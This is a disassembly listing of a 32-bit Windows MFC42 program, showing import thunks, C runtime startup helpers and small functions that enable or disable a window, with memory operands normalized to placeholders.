push 0x64
call Ordinal_MFC42_324
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_4059b0
push esi
mov esi ecx
call sub_405960
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call Ordinal_MFC42_825
add esp 0x4
sub_4059d0
mov eax [ Ordinal_MFC42_4234@IAT ]
retn
sub_4059e0
mov eax r--data
retn
sub_405a60
retn 0x4
sub_405a70
mov eax r--data
retn
sub_405ca0
mov eax [ ecx + 0x60 ]
retn
sub_405cb0
mov eax [ ecx + 0x20 ]
push 0x0
push eax
call [ EnableWindow@IAT ]
retn
sub_405cc0
mov eax [ ecx + 0x20 ]
push 0x1
push eax
call [ EnableWindow@IAT ]
retn
Ordinal_MFC42_4673
jmp [ Ordinal_MFC42_4673@IAT ]
Ordinal_MFC42_6375
jmp [ Ordinal_MFC42_6375@IAT ]
Ordinal_MFC42_4486
jmp [ Ordinal_MFC42_4486@IAT ]
Ordinal_MFC42_2554
jmp [ Ordinal_MFC42_2554@IAT ]
Ordinal_MFC42_2512
jmp [ Ordinal_MFC42_2512@IAT ]
Ordinal_MFC42_5731
jmp [ Ordinal_MFC42_5731@IAT ]
Ordinal_MFC42_3922
jmp [ Ordinal_MFC42_3922@IAT ]
Ordinal_MFC42_1089
jmp [ Ordinal_MFC42_1089@IAT ]
Ordinal_MFC42_5199
jmp [ Ordinal_MFC42_5199@IAT ]
Ordinal_MFC42_2396
jmp [ Ordinal_MFC42_2396@IAT ]
Ordinal_MFC42_3346
jmp [ Ordinal_MFC42_3346@IAT ]
Ordinal_MFC42_5300
jmp [ Ordinal_MFC42_5300@IAT ]
Ordinal_MFC42_5302
jmp [ Ordinal_MFC42_5302@IAT ]
Ordinal_MFC42_2725
jmp [ Ordinal_MFC42_2725@IAT ]
Ordinal_MFC42_4079
jmp [ Ordinal_MFC42_4079@IAT ]
Ordinal_MFC42_4698
jmp [ Ordinal_MFC42_4698@IAT ]
Ordinal_MFC42_5307
jmp [ Ordinal_MFC42_5307@IAT ]
Ordinal_MFC42_5289
jmp [ Ordinal_MFC42_5289@IAT ]
Ordinal_MFC42_5714
jmp [ Ordinal_MFC42_5714@IAT ]
Ordinal_MFC42_2982
jmp [ Ordinal_MFC42_2982@IAT ]
Ordinal_MFC42_3147
jmp [ Ordinal_MFC42_3147@IAT ]
Ordinal_MFC42_3259
jmp [ Ordinal_MFC42_3259@IAT ]
Ordinal_MFC42_4465
jmp [ Ordinal_MFC42_4465@IAT ]
Ordinal_MFC42_3136
jmp [ Ordinal_MFC42_3136@IAT ]
Ordinal_MFC42_3262
jmp [ Ordinal_MFC42_3262@IAT ]
Ordinal_MFC42_2985
jmp [ Ordinal_MFC42_2985@IAT ]
Ordinal_MFC42_3081
jmp [ Ordinal_MFC42_3081@IAT ]
Ordinal_MFC42_2976
jmp [ Ordinal_MFC42_2976@IAT ]
Ordinal_MFC42_3830
jmp [ Ordinal_MFC42_3830@IAT ]
Ordinal_MFC42_3831
jmp [ Ordinal_MFC42_3831@IAT ]
Ordinal_MFC42_3825
jmp [ Ordinal_MFC42_3825@IAT ]
Ordinal_MFC42_3079
jmp [ Ordinal_MFC42_3079@IAT ]
Ordinal_MFC42_4080
jmp [ Ordinal_MFC42_4080@IAT ]
Ordinal_MFC42_4622
jmp [ Ordinal_MFC42_4622@IAT ]
Ordinal_MFC42_4424
jmp [ Ordinal_MFC42_4424@IAT ]
Ordinal_MFC42_3738
jmp [ Ordinal_MFC42_3738@IAT ]
Ordinal_MFC42_561
jmp [ Ordinal_MFC42_561@IAT ]
Ordinal_MFC42_825
jmp [ Ordinal_MFC42_825@IAT ]
Ordinal_MFC42_2621
jmp [ Ordinal_MFC42_2621@IAT ]
Ordinal_MFC42_1134
jmp [ Ordinal_MFC42_1134@IAT ]
Ordinal_MFC42_641
jmp [ Ordinal_MFC42_641@IAT ]
Ordinal_MFC42_5265
jmp [ Ordinal_MFC42_5265@IAT ]
Ordinal_MFC42_4376
jmp [ Ordinal_MFC42_4376@IAT ]
Ordinal_MFC42_4853
jmp [ Ordinal_MFC42_4853@IAT ]
Ordinal_MFC42_4998
jmp [ Ordinal_MFC42_4998@IAT ]
Ordinal_MFC42_4710
jmp [ Ordinal_MFC42_4710@IAT ]
Ordinal_MFC42_2514
jmp [ Ordinal_MFC42_2514@IAT ]
Ordinal_MFC42_6052
jmp [ Ordinal_MFC42_6052@IAT ]
Ordinal_MFC42_4078
jmp [ Ordinal_MFC42_4078@IAT ]
Ordinal_MFC42_1775
jmp [ Ordinal_MFC42_1775@IAT ]
Ordinal_MFC42_4407
jmp [ Ordinal_MFC42_4407@IAT ]
Ordinal_MFC42_5241
jmp [ Ordinal_MFC42_5241@IAT ]
Ordinal_MFC42_2385
jmp [ Ordinal_MFC42_2385@IAT ]
Ordinal_MFC42_5163
jmp [ Ordinal_MFC42_5163@IAT ]
Ordinal_MFC42_6374
jmp [ Ordinal_MFC42_6374@IAT ]
Ordinal_MFC42_4353
jmp [ Ordinal_MFC42_4353@IAT ]
Ordinal_MFC42_5280
jmp [ Ordinal_MFC42_5280@IAT ]
Ordinal_MFC42_3798
jmp [ Ordinal_MFC42_3798@IAT ]
Ordinal_MFC42_4837
jmp [ Ordinal_MFC42_4837@IAT ]
Ordinal_MFC42_4441
jmp [ Ordinal_MFC42_4441@IAT ]
Ordinal_MFC42_2648
jmp [ Ordinal_MFC42_2648@IAT ]
Ordinal_MFC42_2055
jmp [ Ordinal_MFC42_2055@IAT ]
Ordinal_MFC42_6376
jmp [ Ordinal_MFC42_6376@IAT ]
Ordinal_MFC42_3749
jmp [ Ordinal_MFC42_3749@IAT ]
Ordinal_MFC42_5065
jmp [ Ordinal_MFC42_5065@IAT ]
Ordinal_MFC42_1727
jmp [ Ordinal_MFC42_1727@IAT ]
Ordinal_MFC42_5261
jmp [ Ordinal_MFC42_5261@IAT ]
Ordinal_MFC42_2446
jmp [ Ordinal_MFC42_2446@IAT ]
Ordinal_MFC42_2124
jmp [ Ordinal_MFC42_2124@IAT ]
Ordinal_MFC42_5277
jmp [ Ordinal_MFC42_5277@IAT ]
Ordinal_MFC42_4627
jmp [ Ordinal_MFC42_4627@IAT ]
Ordinal_MFC42_4425
jmp [ Ordinal_MFC42_4425@IAT ]
Ordinal_MFC42_3597
jmp [ Ordinal_MFC42_3597@IAT ]
Ordinal_MFC42_324
jmp [ Ordinal_MFC42_324@IAT ]
Ordinal_MFC42_1146
jmp [ Ordinal_MFC42_1146@IAT ]
Ordinal_MFC42_1168
jmp [ Ordinal_MFC42_1168@IAT ]
Ordinal_MFC42_800
jmp [ Ordinal_MFC42_800@IAT ]
Ordinal_MFC42_4160
jmp [ Ordinal_MFC42_4160@IAT ]
Ordinal_MFC42_540
jmp [ Ordinal_MFC42_540@IAT ]
Ordinal_MFC42_2863
jmp [ Ordinal_MFC42_2863@IAT ]
Ordinal_MFC42_2379
jmp [ Ordinal_MFC42_2379@IAT ]
Ordinal_MFC42_755
jmp [ Ordinal_MFC42_755@IAT ]
Ordinal_MFC42_470
jmp [ Ordinal_MFC42_470@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
sub_405eff
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_405f2b
push [ esp + 0x4 ]
call sub_405eff
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_40608f
mov esp [ ebp - 0x18 ]
push [ ebp - 0x78 ]
call [ _exit@IAT ]
int3
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_4060ae
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_4060c0
xor eax eax
retn
sub_4060c3
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
sub_4060d0
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call Ordinal_MFC42_1576
retn 0x10
j_sub_406116
jmp sub_406116
sub_406116
push 0x600
push 0x0
call sub_4060e8
mov [ rw-data ] al
retn
Ordinal_MFC42_1576
jmp [ Ordinal_MFC42_1576@IAT ]
sub_406130
mov eax r--data
jmp __CxxFrameHandler
sub_406140
lea ecx [ ebp - 0x78 ]
jmp sub_405960
sub_406148
mov eax r--data
jmp __CxxFrameHandler
sub_406160
mov ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_641
sub_406168
mov eax r--data
jmp __CxxFrameHandler
sub_406180
lea ecx [ ebp - 0x10 ]
jmp Ordinal_MFC42_800
sub_406188
mov eax r--data
jmp __CxxFrameHandler
sub_4061a0
lea ecx [ ebp - 0x6c ]
jmp sub_405960
sub_4061a8
mov eax r--data
jmp __CxxFrameHandler
